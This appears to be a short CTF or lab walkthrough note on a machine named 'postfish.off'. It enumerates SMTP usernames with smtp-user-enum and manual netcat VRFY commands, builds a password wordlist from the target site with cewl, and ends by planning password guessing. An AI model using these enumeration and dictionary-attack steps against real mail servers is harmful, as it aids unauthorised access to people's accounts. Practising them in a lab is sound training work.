# 3 :25 smtp

```
# smtp user enum from nmapAutomator
[truncated]
postfish.off: postmaster exists
postfish.off: postfix exists
postfish.off: root exists
postfish.off: www-data exists

# we need more usernames
$ smtp-user-enum -U /usr/share/seclists/Usernames/Names/names.txt -t postfish.off

postfish.off: hr exists
postfish.off: sales exists
postfish.off: sys exists

# generate pass from cewl
$ cewl http://192.168.175.137 > pass

# from the /teams.html
# got more usernames

$ nc -nv 192.168.175.137 25
(UNKNOWN) [192.168.175.137] 25 (smtp) open
220 postfish.off ESMTP Postfix (Ubuntu)
HELO x
250 postfish.off
VRFY mike
550 5.1.1 <mike>: Recipient address rejected: User unknown in local recipient table
VRFY mike_ross
550 5.1.1 <mike_ross>: Recipient address rejected: User unknown in local recipient table
VRFY mike.ross
252 2.0.0 mike.ross

# other users exists too
VRFY claire.madison
252 2.0.0 claire.madison
VRFY brian.moore
252 2.0.0 brian.moore
VRFY sarah.lorem
252 2.0.0 sarah.lorem

# we only have mail servers as nothing on 80; time to find some password via guessing simple ones else we try cewl dict attack.
```
